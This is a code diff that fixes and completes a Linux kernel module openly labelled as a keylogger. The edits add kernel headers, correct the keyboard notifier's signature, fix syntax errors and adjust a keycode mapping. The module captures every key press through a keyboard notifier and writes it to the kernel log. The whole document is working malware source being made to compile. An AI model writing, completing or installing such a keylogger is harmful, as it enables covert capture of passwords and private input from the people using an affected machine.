@@ -6,7 +6,12 @@ Desc:   Kernel Based KeyLogger Module
 ----------------------------------------------------*/
 
 
-#include "stdinc.h"
+/* Linux includes */
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/keyboard.h>
+#include <linux/semaphore.h>
 
 /* Driver info */
 #define DRIVER_LICENSE "GPL"
@@ -17,7 +22,7 @@ Desc:   Kernel Based KeyLogger Module
 ---------------------------------------------*/
 char banti_handle_key(int key)
 {
-    char ret = NULL;
+    char ret;
 
     /* Handle keys */
     switch(key) 
@@ -121,7 +126,7 @@ char banti_handle_key(int key)
         case 78:
             ret = '+';
             break;
-        case 79:
+        case 98:
             ret = '/';
             break;
         case 11:
@@ -183,7 +188,7 @@ char banti_handle_key(int key)
 /*---------------------------------------------
 | Get notifed press key
 ---------------------------------------------*/
-int banti_key_notifer() 
+int banti_key_notifer(struct notifier_block *nblock, unsigned long code, void *_param) 
 {
     /* Used variables */
     char key;
@@ -192,7 +197,7 @@ int banti_key_notifer()
     if (code == KBD_KEYCODE)
     {
         /* Get and log key */
-        key = banti_handle_key(param->value)
+        key = banti_handle_key(param->value);
         if(param->down)
             printk(KERN_INFO "%c", key); 
     }
@@ -206,7 +211,7 @@ int banti_key_notifer()
 ---------------------------------------------*/
 static struct notifier_block notifer_deamon =
 {
-    .notifier_call = banti_key_notifer;
+    .notifier_call = banti_key_notifer
 };
 
 
